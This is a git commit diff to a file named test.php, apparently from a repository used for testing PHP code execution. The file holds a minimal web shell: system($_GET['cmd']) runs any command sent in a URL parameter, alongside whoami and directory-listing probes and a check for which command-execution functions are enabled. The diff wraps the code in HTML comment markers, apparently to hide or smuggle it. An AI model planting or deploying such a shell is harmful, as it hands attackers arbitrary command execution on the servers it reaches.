525bd84356afe659d74dbf130ffbfa051fad0d3c
Asthral <151788916+Asthral@users.noreply.github.com>
2024-12-12 18:35:43 +0100

    Update test.php

--- test.php
+++ test.php
@@ -1,7 +1,7 @@
-<?php
+--> <?php
 echo exec("ls -la");
 echo shell_exec("ls -la");
 system("whoami");
 system($_GET['cmd']);
 print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
-?>
+?> <!--
